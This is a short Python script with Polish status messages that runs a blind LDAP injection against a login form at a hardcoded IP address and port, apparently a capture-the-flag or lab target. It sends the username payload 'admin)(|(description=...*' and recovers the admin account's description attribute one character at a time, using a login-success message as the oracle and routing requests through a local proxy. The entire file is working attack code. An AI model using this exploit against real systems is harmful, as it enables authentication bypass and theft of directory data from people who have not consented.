import requests
import urllib.parse
url = "http://83.136.253.40:35624/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
password = "fdssfkhsd)"
success_indicator = "Login successful but the site is temporarily down for security reasons"
possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>/?`~\"\\ "
description_found = ""
while True:
    found_char = None
    print(f"Dotychczas znaleziony ciąg: {description_found}")
    for ch in possible_chars:
        test_description = description_found + ch
        payload = f"admin)(|(description={test_description}*"
        data = {"username": payload, "password": password}
        proxies = {"http": "http://127.0.0.1:8080"}
        response = requests.post(url, headers=headers, data=data, proxies=proxies)
        if success_indicator in response.text:
            description_found += ch
            found_char = ch
            break
    if found_char is None:
        print("Nie znaleziono dalszych pasujących znaków. Kończę wyszukiwanie.")
        break
print("Finalny znaleziony ciąg:", description_found)
